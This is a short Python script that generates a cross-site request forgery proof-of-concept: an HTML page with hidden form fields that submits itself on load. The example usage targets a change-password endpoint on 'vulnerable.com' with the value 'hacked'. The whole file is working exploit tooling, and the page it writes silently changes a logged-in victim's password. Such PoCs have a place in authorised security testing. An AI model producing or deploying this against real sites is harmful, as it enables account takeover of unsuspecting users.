def generate_csrf_poc(action_url, method="POST", parameters=None):
    # Default to an empty dictionary if no parameters are provided
    if parameters is None:
        parameters = {}
    
    # Create hidden form fields from the parameters
    form_fields = "".join([f"<input type='hidden' name='{key}' value='{value}' />" 
                          for key, value in parameters.items()])
    
    # Generate the HTML content with an auto-submitting form
    html_content = f"""
    <html>
    <body>
        <h3>CSRF PoC</h3>
        <p>This page will automatically submit the form to test CSRF.</p>
        <form id="csrf_form" action="{action_url}" method="{method}">
            {form_fields}
        </form>
        <script>
            document.getElementById("csrf_form").submit();
        </script>
    </body>
    </html>
    """
    with open("csrf_poc.html", "w") as f:
        f.write(html_content)
    print("CSRF PoC saved as 'csrf_poc.html'")

# Example usage
action = "http://vulnerable.com/change_password"
params = {"new_password": "hacked"}
generate_csrf_poc(action, "POST", params)
